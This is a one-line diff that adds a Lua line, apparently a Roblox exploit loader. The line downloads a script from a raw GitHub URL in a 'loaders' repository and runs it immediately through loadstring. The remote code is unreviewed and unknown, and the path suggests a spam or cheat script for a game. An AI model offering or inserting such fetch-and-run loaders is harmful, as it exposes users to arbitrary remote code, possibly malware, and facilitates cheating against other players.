@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/run-a-sari-sari-store-spam6-xmsr81ccmaxh3o.lua"))()
